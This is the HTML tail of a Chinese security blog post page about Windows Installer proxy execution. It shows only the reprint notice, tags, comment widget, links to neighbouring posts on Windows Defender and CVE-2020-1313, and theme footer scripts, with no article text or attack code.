+                    <a href="https://yanghaoi.github.io/2026/08/31/windows-installer-an-zhuang-bao-de-gou-jian-he-zhi-xing/">https://yanghaoi.github.io/2026/08/31/windows-installer-an-zhuang-bao-de-gou-jian-he-zhi-xing/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">YangHao</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Proxy-Execution/">
+                                    <span class="chip bg-color">Proxy Execution</span>
+                                </a>
+                            
+                                <a href="/tags/Msiexec/">
+                                    <span class="chip bg-color">Msiexec</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'yJD2aXK8GcbXmInljhvHyB1j-gzGzoHsz',
+        appKey: 'p2SkNvakylQnkba2lMvTS09d',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2026/08/31/tong-guo-c-cao-zuo-zhu-ce-biao-jin-yong-windows-defender/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/17.jpg" class="responsive-img" alt="通过 C++ 操作注册表禁用 Windows Defender">
+                        
+                        <span class="card-title">通过 C++ 操作注册表禁用 Windows Defender</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            通过在安装了其他反病毒软件的前提下，通过编程实现禁用 WinDefend 的服务，随后经过一些操作可实现完全禁用WinDefend。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2026-08-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="post-category">
+                                    安全工具
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/C-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/">
+                        <span class="chip bg-color">C++ 注册表操作</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2026/08/31/windows-ben-di-ti-quan-lou-dong-cve-2020-1313-fu-xian/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="Windows本地提权漏洞CVE-2020-1313复现">
+                        
+                        <span class="card-title">Windows本地提权漏洞CVE-2020-1313复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Windows Update Orchestrator Service 存在无需认证的API接口，利用接口可在注册表项中添加将以SYSTEM权限运行的计划任务，从而获得权限提升(CVE-2020-1313)。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                        <span class="chip bg-color">权限提升</span>
+                    </a>
+                    
+                    <a href="/tags/Windows-10/">
+                        <span class="chip bg-color">Windows 10</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2020-1313/">
+                        <span class="chip bg-color">CVE-2020-1313</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('1120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Yang Hao&#39;s blog<br />'
+            + '文章作者: YangHao<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('5'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">YangHao</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">77.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "08";
+                    var startDate = "10";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已缓慢运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已缓慢运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+
+			<br>
+			
+            <span id="showcdn" style='display:none;'>当前CDN节点: <span id="cdn">【未知】</span>&nbsp;|&nbsp;你的ip: <span id="ip">【未知】</span>&nbsp;|&nbsp;你的所在国家/地区: <span id="loc">【未知】</span></span>
+            <script>
+                	getCDNinfo = function() {
+	$.ajax({
+		url: "https://cdnjs.cloudflare.com/cdn-cgi/trace",
+		success: function(data, status) {
+			let areas = "Antananarivo, Madagascar - (TNR);Cape Town, South Africa - (CPT);Casablanca, Morocco - (CMN);Dar Es Salaam, Tanzania - (DAR);Djibouti City, Djibouti - (JIB);Durban, South Africa - (DUR);Johannesburg, South Africa - (JNB);Kigali, Rwanda - (KGL);Lagos, Nigeria - (LOS);Luanda, Angola - (LAD);Maputo, MZ - (MPM);Mombasa, Kenya - (MBA);Port Louis, Mauritius - (MRU);Réunion, France - (RUN);Bangalore, India - (BLR);Bangkok, Thailand - (BKK);Bandar Seri Begawan, Brunei - (BWN);Cebu, Philippines - (CEB);Chengdu, China - (CTU);Chennai, India - (MAA);Chittagong, Bangladesh - (CGP);Chongqing, China - (CKG);Colombo, Sri Lanka - (CMB);Dhaka, Bangladesh - (DAC);Dongguan, China - (SZX);Foshan, China - (FUO);Fuzhou, China - (FOC);Guangzhou, China - (CAN);Hangzhou, China - (HGH);Hanoi, Vietnam - (HAN);Hengyang, China - (HNY);Ho Chi Minh City, Vietnam - (SGN);Hong Kong - (HKG);Hyderabad, India - (HYD);Islamabad, Pakistan - (ISB);Jakarta, Indonesia - (CGK);Jinan, China - (TNA);Karachi, Pakistan - (KHI);Kathmandu, Nepal - (KTM);Kolkata, India - (CCU);Kuala Lumpur, Malaysia - (KUL);Lahore, Pakistan - (LHE);Langfang, China - (NAY);Luoyang, China - (LYA);Macau - (MFM);Malé, Maldives - (MLE);Manila, Philippines - (MNL);Mumbai, India - (BOM);Nagpur, India - (NAG);Nanning, China - (NNG);New Delhi, India - (DEL);Osaka, Japan - (KIX);Phnom Penh, Cambodia - (PNH);Qingdao, China - (TAO);Seoul, South Korea - (ICN);Shanghai, China - (SHA);Shenyang, China - (SHE);Shijiazhuang, China - (SJW);Singapore, Singapore - (SIN);Suzhou, China - (SZV);Taipei - (TPE);Thimphu, Bhutan - (PBH);Tianjin, China - (TSN);Tokyo, Japan - (NRT);Ulaanbaatar, Mongolia - (ULN);Vientiane, Laos - (VTE);Wuhan, China - (WUH);Wuxi, China - (WUX);Xi'an, China - (XIY);Yerevan, Armenia - (EVN);Zhengzhou, China - (CGO);Zuzhou, China - (CSX);Amsterdam, Netherlands - (AMS);Athens, Greece - (ATH);Barcelona, Spain - (BCN);Belgrade, Serbia - (BEG);Berlin, Germany - (TXL);Brussels, Belgium - (BRU);Bucharest, Romania - (OTP);Budapest, Hungary - (BUD);Chișinău, Moldova - (KIV);Copenhagen, Denmark - (CPH);Cork, Ireland -  (ORK);Dublin, Ireland - (DUB);Düsseldorf, Germany - (DUS);Edinburgh, United Kingdom - (EDI);Frankfurt, Germany - (FRA);Geneva, Switzerland - (GVA);Gothenburg, Sweden - (GOT);Hamburg, Germany - (HAM);Helsinki, Finland - (HEL);Istanbul, Turkey - (IST);Kyiv, Ukraine - (KBP);Lisbon, Portugal - (LIS);London, United Kingdom - (LHR);Luxembourg City, Luxembourg - (LUX);Madrid, Spain - (MAD);Manchester, United Kingdom - (MAN);Marseille, France - (MRS);Milan, Italy - (MXP);Moscow, Russia - (DME);Munich, Germany - (MUC);Nicosia, Cyprus - (LCA);Oslo, Norway - (OSL);Paris, France - (CDG);Prague, Czech Republic - (PRG);Reykjavík, Iceland - (KEF);Riga, Latvia - (RIX);Rome, Italy - (FCO);Saint Petersburg, Russia - (LED);Sofia, Bulgaria - (SOF);Stockholm, Sweden - (ARN);Tallinn, Estonia - (TLL);Thessaloniki, Greece - (SKG);Vienna, Austria - (VIE);Vilnius, Lithuania - (VNO);Warsaw, Poland - (WAW);Zagreb, Croatia - (ZAG);Zürich, Switzerland - (ZRH);Arica, Chile - (ARI);Asunción, Paraguay - (ASU);Bogotá, Colombia - (BOG);Buenos Aires, Argentina - (EZE);Curitiba, Brazil - (CWB);Fortaleza, Brazil - (FOR);Guatemala City, Guatemala - (GUA);Lima, Peru - (LIM);Medellín, Colombia - (MDE);Panama City, Panama - (PTY);Porto Alegre, Brazil - (POA);Quito, Ecuador - (UIO);Rio de Janeiro, Brazil - (GIG);São Paulo, Brazil - (GRU);Santiago, Chile - (SCL);Willemstad, Curaçao - (CUR);St. George's, Grenada - (GND);Amman, Jordan - (AMM);Baghdad, Iraq - (BGW);Baku, Azerbaijan - (GYD);Beirut, Lebanon - (BEY);Doha, Qatar - (DOH);Dubai, United Arab Emirates - (DXB);Kuwait City, Kuwait - (KWI);Manama, Bahrain - (BAH);Muscat, Oman - (MCT);Ramallah - (ZDM);Riyadh, Saudi Arabia - (RUH);Tel Aviv, Israel - (TLV);Ashburn, VA, United States - (IAD);Atlanta, GA, United States - (ATL);Boston, MA, United States - (BOS);Buffalo, NY, United States - (BUF);Calgary, AB, Canada - (YYC);Charlotte, NC, United States - (CLT);Chicago, IL, United States - (ORD);Columbus, OH, United States - (CMH);Dallas, TX, United States - (DFW);Denver, CO, United States - (DEN);Detroit, MI, United States - (DTW);Honolulu, HI, United States - (HNL);Houston, TX, United States - (IAH);Indianapolis, IN, United States - (IND);Jacksonville, FL, United States - (JAX);Kansas City, MO, United States - (MCI);Las Vegas, NV, United States - (LAS);Los Angeles, CA, United States - (LAX);McAllen, TX, United States - (MFE);Memphis, TN, United States - (MEM);Mexico City, Mexico - (MEX);Miami, FL, United States - (MIA);Minneapolis, MN, United States - (MSP);Montgomery, AL, United States - (MGM);Montréal, QC, Canada - (YUL);Nashville, TN, United States - (BNA);Newark, NJ, United States - (EWR);Norfolk, VA, United States - (ORF);Omaha, NE, United States - (OMA);Philadelphia, United States - (PHL);Phoenix, AZ, United States - (PHX);Pittsburgh, PA, United States - (PIT);Port-Au-Prince, Haiti - (PAP);Portland, OR, United States - (PDX);Queretaro, MX, Mexico - (QRO);Richmond, Virginia - (RIC);Sacramento, CA, United States - (SMF);Salt Lake City, UT, United States - (SLC);San Diego, CA, United States - (SAN);San Jose, CA, United States - (SJC);Saskatoon, SK, Canada - (YXE);Seattle, WA, United States - (SEA);St. Louis, MO, United States - (STL);Tampa, FL, United States - (TPA);Toronto, ON, Canada - (YYZ);Vancouver, BC, Canada - (YVR);Tallahassee, FL, United States - (TLH);Winnipeg, MB, Canada - (YWG);Adelaide, SA, Australia - (ADL);Auckland, New Zealand - (AKL);Brisbane, QLD, Australia - (BNE);Melbourne, VIC, Australia - (MEL);Noumea, New caledonia - (NOU);Perth, WA, Australia - (PER);Sydney, NSW, Australia - (SYD)".split(";");
+			let area = data.split("colo=")[1].split("\n")[0];
+			for (var i = 0; i < areas.length; i++) {
+				if (areas[i].indexOf(area) != -1) {
+					$("#cdn").text(areas[i]);
+					$("#ip").text(data.split("ip=")[1].split("\n")[0]);
+					$("#loc").text(data.split("loc=")[1].split("\n")[0]);
+					break;
+				}
+			}
+			$("#showcdn").css('display','block');
+		}
+	})
+}
+$(document).ready(function() {
+	getCDNinfo();
+});
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+
+
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+	
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/matery.js"></script>
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
